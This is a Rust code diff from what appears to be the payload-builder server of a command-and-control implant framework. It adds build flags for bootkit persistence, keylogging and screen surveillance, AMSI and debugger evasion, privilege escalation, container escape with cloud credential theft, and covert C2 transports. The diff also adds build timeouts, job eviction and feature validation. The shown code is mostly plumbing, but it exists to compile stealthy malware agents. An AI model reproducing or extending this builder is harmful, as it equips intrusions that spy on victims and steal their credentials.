@@ -186,6 +186,75 @@ pub struct BuildFeatures {
     /// Enables delayed module-stomp injection.
     #[serde(default)]
     pub delayed_stomp: bool,
+    /// Enables UEFI persistence (NVRAM + ESP bootkit).
+    #[serde(default)]
+    pub uefi_persistence: bool,
+    /// Enables macOS post-exploitation capabilities.
+    #[serde(default)]
+    pub macos_postexp: bool,
+    /// Enables phantom DLL hollowing injection.
+    #[serde(default)]
+    pub phantom_dll_hollow: bool,
+    /// Enables SEH-based anti-debugging.
+    #[serde(default)]
+    pub seh_anti_debug: bool,
+    /// Enables ARM64 PAC bypass.
+    #[serde(default)]
+    pub pac_bypass: bool,
+    /// Enables hardware-breakpoint hooking framework.
+    #[serde(default)]
+    pub hw_bp_hook: bool,
+    /// Enables Microsoft Graph API C2 transport.
+    #[serde(default)]
+    pub graph_transport: bool,
+    /// Enables QUIC (HTTP/3) C2 transport.
+    #[serde(default)]
+    pub quic_transport: bool,
+    /// Enables surveillance capabilities (screenshot, keylogger, clipboard).
+    #[serde(default)]
+    pub surveillance: bool,
+    /// Enables HCI research telemetry.
+    #[serde(default)]
+    pub hci_research: bool,
+    /// Enables traffic normalization.
+    #[serde(default)]
+    pub traffic_normalization: bool,
+    /// Enables performance optimizations.
+    #[serde(default)]
+    pub perf_optimize: bool,
+    /// Enables idle memory encryption (memory guard).
+    #[serde(default)]
+    pub memory_guard: bool,
+    /// Enables ETW trace checking.
+    #[serde(default)]
+    pub etw_check: bool,
+    /// Enables module signature verification.
+    #[serde(default)]
+    pub module_signatures: bool,
+    /// Enables environment validation checks.
+    #[serde(default)]
+    pub env_validation: bool,
+    /// Enables perfect forward secrecy (X25519 ECDH).
+    #[serde(default)]
+    pub forward_secrecy: bool,
+    /// Enables hardware-breakpoint AMSI bypass.
+    #[serde(default)]
+    pub hwbp_amsi: bool,
+    /// Enables write-raid AMSI bypass.
+    #[serde(default)]
+    pub write_raid_amsi: bool,
+    /// Enables thread context encryption during sleep.
+    #[serde(default)]
+    pub thread_ctx_encrypt: bool,
+    /// Enables automated reconnaissance (AD/LDAP enumeration).
+    #[serde(default)]
+    pub recon: bool,
+    /// Enables local privilege escalation.
+    #[serde(default)]
+    pub lpe: bool,
+    /// Enables container escape and cloud credential theft.
+    #[serde(default)]
+    pub container_escape: bool,
 }
 
 #[derive(Serialize)]
@@ -220,6 +289,11 @@ pub struct BuildJob {
     pub server_build_dir: PathBuf,
     pub state_ref: Arc<AppState>,
 }
+
+/// Maximum number of completed/failed job records kept in memory.
+/// When this limit is reached the oldest terminal entries are evicted
+/// before a new job is enqueued.
+const JOB_MAP_CAPACITY: usize = 10_000;
 
 static JOB_MAP: OnceLock<Arc<Mutex<HashMap<String, JobState>>>> = OnceLock::new();
 static JOB_SENDER: OnceLock<mpsc::Sender<BuildJob>> = OnceLock::new();
@@ -271,26 +345,54 @@ pub fn init_build_queue(workers: usize, build_dir: PathBuf, retention_days: u32)
                     state_ref,
                 } = job;
 
-                let res = tokio::task::spawn_blocking({
-                    let map2 = map_clone.clone();
-                    let jid = job_id.clone();
-                    let agent_secret = state_ref.config.agent_shared_secret.clone();
-                    let module_key = state_ref.config.module_aes_key.clone();
-                    move || {
-                        execute_build_safely(
-                            jid,
-                            req,
-                            operator,
-                            server_build_dir,
-                            map2,
-                            agent_secret,
-                            module_key,
-                        )
+                let res = tokio::time::timeout(
+                    std::time::Duration::from_secs(1800), // 30-minute build timeout
+                    tokio::task::spawn_blocking({
+                        let map2 = map_clone.clone();
+                        let jid = job_id.clone();
+                        let agent_secret = state_ref.config.agent_shared_secret.clone();
+                        let module_key = state_ref.config.module_aes_key.clone();
+                        // Derive the Ed25519 verify key from the signing key so
+                        // the built agent verifies modules against the server's key.
+                        let module_verify_key = state_ref
+                            .config
+                            .module_signing_key
+                            .as_ref()
+                            .and_then(|b64| {
+                                use base64::Engine;
+                                let bytes = base64::engine::general_purpose::STANDARD
+                                    .decode(b64)
+                                    .ok()?;
+                                let seed: [u8; 32] = bytes.try_into().ok()?;
+                                let signing = ed25519_dalek::SigningKey::from_bytes(&seed);
+                                let verify_b64 = base64::engine::general_purpose::STANDARD
+                                    .encode(signing.verifying_key().to_bytes());
+                                Some(verify_b64)
+                            });
+                        move || {
+                            execute_build_safely(
+                                jid,
+                                req,
+                                operator,
+                                server_build_dir,
+                                map2,
+                                agent_secret,
+                                module_key,
+                                module_verify_key,
+                            )
+                        }
+                    }),
+                )
+                .await;
+
+                // H-6: handle timeout — the build exceeded the 30-minute limit.
+                let res = match res {
+                    Ok(join_res) => {
+                        // P2-15: propagate JoinError instead of panicking.
+                        join_res.unwrap_or_else(|e| Err(anyhow::anyhow!("build task panicked: {e}")))
                     }
-                })
-                .await
-                // P2-15: propagate JoinError instead of panicking.
-                .unwrap_or_else(|e| Err(anyhow::anyhow!("build task panicked: {e}")));
+                    Err(_) => Err(anyhow::anyhow!("build timed out after 1800 seconds")),
+                };
 
                 let (outcome_str, fs_path, error) = match res {
                     Ok(path) => ("Completed", Some(path), None),
@@ -489,6 +591,23 @@ pub async fn handle_build(
 
     {
         let mut m = map.lock().unwrap();
+
+        // M-11: cap the job map to prevent unbounded growth.
+        // If we are at or above capacity, evict the oldest terminal
+        // (Completed / Failed) entries first, oldest by started_at.
+        if m.len() >= JOB_MAP_CAPACITY {
+            let mut candidates: Vec<(String, u64)> = m
+                .iter()
+                .filter(|(_, v)| v.status != "Running")
+                .map(|(k, v)| (k.clone(), v.started_at))
+                .collect();
+            candidates.sort_by_key(|&(_, ts)| ts);
+            let to_remove = m.len() - JOB_MAP_CAPACITY + 1;
+            for (k, _) in candidates.into_iter().take(to_remove) {
+                m.remove(&k);
+            }
+        }
+
         m.insert(
             job_id.clone(),
             JobState {
@@ -572,6 +691,7 @@ fn execute_build_safely(
     map_rc: Arc<Mutex<HashMap<String, JobState>>>,
     agent_shared_secret: String,
     module_aes_key: Option<String>,
+    module_verify_key: Option<String>,
 ) -> anyhow::Result<String> {
     let append_log = |line: &str| {
         if let Ok(mut m) = map_rc.lock() {
@@ -595,7 +715,7 @@ fn execute_build_safely(
 
     copy_workspace_for_build(workspace, tmp_path)?;
 
-    let profile = build_profile_from_request(&job_id, &req, &agent_shared_secret, module_aes_key)?;
+    let profile = build_profile_from_request(&job_id, &req, &agent_shared_secret, module_aes_key, module_verify_key)?;
 
     append_log("Executing cargo build within sandbox limits...");
 
@@ -740,6 +860,7 @@ fn build_profile_from_request(
     req: &BuildRequest,
     agent_shared_secret: &str,
     module_aes_key: Option<String>,
+    module_verify_key: Option<String>,
 ) -> anyhow::Result<builder::config::PayloadConfig> {
     validate_cert_pin(&req.pin)?;
     validate_target_os_arch(&req.os, &req.arch)?;
@@ -829,6 +950,75 @@ fn build_profile_from_request(
     if req.features.delayed_stomp {
         push_feature(&mut features, "delayed-stomp");
     }
+    if req.features.uefi_persistence {
+        push_feature(&mut features, "uefi-persistence");
+    }
+    if req.features.macos_postexp {
+        push_feature(&mut features, "macos-postexp");
+    }
+    if req.features.phantom_dll_hollow {
+        push_feature(&mut features, "phantom-dll-hollow");
+    }
+    if req.features.seh_anti_debug {
+        push_feature(&mut features, "seh-anti-debug");
+    }
+    if req.features.pac_bypass {
+        push_feature(&mut features, "pac-bypass");
+    }
+    if req.features.hw_bp_hook {
+        push_feature(&mut features, "hw-bp-hook");
+    }
+    if req.features.graph_transport {
+        push_feature(&mut features, "graph-transport");
+    }
+    if req.features.quic_transport {
+        push_feature(&mut features, "quic-transport");
+    }
+    if req.features.surveillance {
+        push_feature(&mut features, "surveillance");
+    }
+    if req.features.hci_research {
+        push_feature(&mut features, "hci-research");
+    }
+    if req.features.traffic_normalization {
+        push_feature(&mut features, "traffic-normalization");
+    }
+    if req.features.perf_optimize {
+        push_feature(&mut features, "perf-optimize");
+    }
+    if req.features.memory_guard {
+        push_feature(&mut features, "memory-guard");
+    }
+    if req.features.etw_check {
+        push_feature(&mut features, "etw-check");
+    }
+    if req.features.module_signatures {
+        push_feature(&mut features, "module-signatures");
+    }
+    if req.features.env_validation {
+        push_feature(&mut features, "env-validation");
+    }
+    if req.features.forward_secrecy {
+        push_feature(&mut features, "forward-secrecy");
+    }
+    if req.features.hwbp_amsi {
+        push_feature(&mut features, "hwbp-amsi");
+    }
+    if req.features.write_raid_amsi {
+        push_feature(&mut features, "write-raid-amsi");
+    }
+    if req.features.thread_ctx_encrypt {
+        push_feature(&mut features, "thread-ctx-encrypt");
+    }
+    if req.features.recon {
+        push_feature(&mut features, "recon");
+    }
+    if req.features.lpe {
+        push_feature(&mut features, "lpe");
+    }
+    if req.features.container_escape {
+        push_feature(&mut features, "container-escape");
+    }
     // Auto-enable transport feature based on transport field
     match transport {
         builder::config::PayloadTransport::Http => push_feature(&mut features, "http-transport"),
@@ -854,12 +1044,30 @@ fn build_profile_from_request(
             clone_from: None,
         });
 
+    // L-13: Validate that every requested feature actually exists in
+    // agent/Cargo.toml.  This catches typos and stale API calls before
+    // spawning cargo, producing a clear HTTP 400 instead of an opaque
+    // build failure.
+    {
+        let unknown: Vec<&str> = features
+            .iter()
+            .filter(|f| !VALID_AGENT_FEATURES.contains(&f.as_str()))
+            .map(String::as_str)
+            .collect();
+        if !unknown.is_empty() {
+            anyhow::bail!(
+                "unknown agent feature flags: {}; available features: {}",
+                unknown.join(", "),
+                VALID_AGENT_FEATURES.join(", ")
+            );
+        }
+    }
+
     Ok(builder::config::PayloadConfig {
         target_os: req.os.clone(),
         target_arch: req.arch.clone(),
         c2_address: c2_addr,
         encryption_key: req.key.clone(),
-        hmac_key: None,
         // Use the server's actual agent_shared_secret as the PSK so the agent
         // authenticates with the same secret the server expects.
         c_server_secret: Some(agent_shared_secret.to_string()),
@@ -897,6 +1105,7 @@ fn build_profile_from_request(
         strip_signature: true,
         strip_debug: true,
         module_aes_key,
+        module_verify_key,
         driver_path: req
             .driver_path
             .as_deref()
@@ -911,6 +1120,100 @@ const ALLOWED_OS: &[&str] = &["linux", "windows", "macos"];
 
 /// Allowed target architectures for builds.
 const ALLOWED_ARCH: &[&str] = &["x86_64", "aarch64"];
+
+/// Complete set of feature flags declared in `agent/Cargo.toml`.
+///
+/// Used by `build_profile_from_request` to validate that every requested
+/// feature actually exists in the agent crate before spawning `cargo build`,
+/// so that typos or stale API calls produce a clear HTTP 400 error instead
+/// of an opaque build failure.
+///
+/// Keep this list in sync with `agent/Cargo.toml [features]`.
+const VALID_AGENT_FEATURES: &[&str] = &[
+    "p2p-tcp",
+    "ppid-spoofing",
+    "stealth",
+    "dev",
+    "hot-reload",
+    "env-validation",
+    "persistence",
+    "network-discovery",
+    "remote-assist",
+    "module-signatures",
+    "strict-module-key",
+    "direct-syscalls",
+    "etw-check",
+    "stack-spoof",
+    "manual-map",
+    "traffic-normalization",
+    "perf-optimize",
+    "module-stomp",
+    "thread-hijack",
+    "threadpool-inject",
+    "fiber-inject",
+    "context-only",
+    "section-map",
+    "callback-inject",
+    "hci-research",
+    "outbound-c",
+    "forward-secrecy",
+    "unsafe-runtime-rewrite",
+    "memory-guard",
+    "doh-transport",
+    "http-transport",
+    "browser-data",
+    "lsa-whisperer",
+    "surveillance",
+    "ssh-transport",
+    "smb-pipe-transport",
+    "graph-transport",
+    "quic-transport",
+    "hwbp-amsi",
+    "hw-bp-hook",
+    "write-raid-amsi",
+    "evanesco",
+    "thread-ctx-encrypt",
+    "kernel-callback",
+    "embedded_driver",
+    "self-reencode",
+    "evasion-transform",
+    "transacted-hollowing",
+    "delayed-stomp",
+    "phantom-dll-hollow",
+    "syscall-emulation",
+    "seh-anti-debug",
+    "cet-bypass",
+    "pac-bypass",
+    "token-impersonation",
+    "lpe",
+    "container-escape",
+    "forensic-cleanup",
+    "recon",
+    "kerberos-relay",
+    "dpapi-backup",
+    "shadow-credentials",
+    "s4u-abuse",
+    "lolbin-xwizard",
+    "wsl2-evasion",
+    "com-hijack",
+    "vss-pivot",
+    "office-addin",
+    "wmi-persistence",
+    "uefi-persistence",
+    "hardware-persistence",
+    "ebpf",
+    "trampoline-spoof",
+    "cfg-bypass",
+    "adaptive-timing",
+    "reflective-loader",
+    "page-fault-exec",
+    "coop",
+    "entra-ptc",
+    "entra-attacks",
+    "entra-app-abuse",
+    "adcs-attacks",
+    "macos-postexp",
+];
 
 fn parse_payload_format(format: &str) -> anyhow::Result<builder::config::PayloadFormat> {
     match format.trim().to_ascii_lowercase().as_str() {
@@ -1337,7 +1640,7 @@ mod tests {
     #[test]
     fn server_build_profile_targets_outbound_agent_with_pin() {
         let profile =
-            build_profile_from_request("job123", &request(), "test_secret", None).unwrap();
+            build_profile_from_request("job123", &request(), "test_secret", None, None).unwrap();
         assert_eq!(profile.package, "agent");
         assert_eq!(profile.bin_name.as_deref(), Some("agent-standalone"));
         assert_eq!(profile.output_name.as_deref(), Some("job123"));
@@ -1357,7 +1660,7 @@ mod tests {
             ..BuildFeatures::default()
         };
 
-        let profile = build_profile_from_request("job123", &req, "test_secret", None).unwrap();
+        let profile = build_profile_from_request("job123", &req, "test_secret", None, None).unwrap();
 
         assert!(profile.features.contains(&"p2p-tcp".to_string()));
         assert!(!profile.features.contains(&"p2p".to_string()));
@@ -1370,7 +1673,7 @@ mod tests {
         req.transport_config.http_endpoint = Some("https://front.example.com/c2".into());
         req.transport_config.http_host_header = Some("c2.example.com".into());
 
-        let profile = build_profile_from_request("job123", &req, "test_secret", None).unwrap();
+        let profile = build_profile_from_request("job123", &req, "test_secret", None, None).unwrap();
 
         assert_eq!(profile.transport, builder::config::PayloadTransport::Http);
         assert!(profile.features.contains(&"http-transport".to_string()));
@@ -1389,13 +1692,13 @@ mod tests {
         let mut req = request();
         req.transport = "ssh".into();
 
-        let err = build_profile_from_request("job123", &req, "test_secret", None).unwrap_err();
+        let err = build_profile_from_request("job123", &req, "test_secret", None, None).unwrap_err();
         assert!(err.to_string().contains("ssh_username"));
 
         req.transport_config.ssh_username = Some("operator".into());
         req.transport_config.ssh_auth = Some(common::config::SshAuthConfig::Agent);
 
-        let profile = build_profile_from_request("job123", &req, "test_secret", None).unwrap();
+        let profile = build_profile_from_request("job123", &req, "test_secret", None, None).unwrap();
         assert_eq!(profile.transport, builder::config::PayloadTransport::Ssh);
         assert!(profile.features.contains(&"ssh-transport".to_string()));
         assert_eq!(
@@ -1417,7 +1720,7 @@ mod tests {
         req.jitter = 37;
         req.kill_date = Some("2099-12-31".into());
 
-        let profile = build_profile_from_request("job123", &req, "test_secret", None).unwrap();
+        let profile = build_profile_from_request("job123", &req, "test_secret", None, None).unwrap();
 
         assert_eq!(
             profile.output_format,
@@ -1433,7 +1736,7 @@ mod tests {
         let mut req = request();
         req.format = "shellcode".into();
 
-        let err = build_profile_from_request("job123", &req, "test_secret", None).unwrap_err();
+        let err = build_profile_from_request("job123", &req, "test_secret", None, None).unwrap_err();
 
         assert!(err.to_string().contains("windows/x86_64"));
     }
@@ -1471,9 +1774,32 @@ mod tests {
             token_impersonation: true,
             transacted_hollowing: true,
             delayed_stomp: true,
+            uefi_persistence: false,
+            macos_postexp: false,
+            phantom_dll_hollow: false,
+            seh_anti_debug: false,
+            pac_bypass: false,
+            hw_bp_hook: false,
+            graph_transport: false,
+            quic_transport: false,
+            surveillance: false,
+            hci_research: false,
+            traffic_normalization: false,
+            perf_optimize: false,
+            memory_guard: false,
+            etw_check: false,
+            module_signatures: false,
+            env_validation: false,
+            forward_secrecy: false,
+            hwbp_amsi: false,
+            write_raid_amsi: false,
+            thread_ctx_encrypt: false,
+            recon: false,
+            lpe: false,
+            container_escape: false,
         };
 
-        let profile = build_profile_from_request("job123", &req, "test_secret", None).unwrap();
+        let profile = build_profile_from_request("job123", &req, "test_secret", None, None).unwrap();
         let expected = [
             "outbound-c",
             "persistence",
@@ -1510,8 +1836,12 @@ mod tests {
             );
         }
 
-        let available = builder::config::read_agent_features().unwrap();
-        let (_, unknown) = builder::config::partition_features(&profile.features, &available);
+        let unknown: Vec<&str> = profile
+            .features
+            .iter()
+            .filter(|f| !VALID_AGENT_FEATURES.contains(&f.as_str()))
+            .map(String::as_str)
+            .collect();
         assert!(
             unknown.is_empty(),
             "server emitted features not declared in agent/Cargo.toml: {unknown:?}"
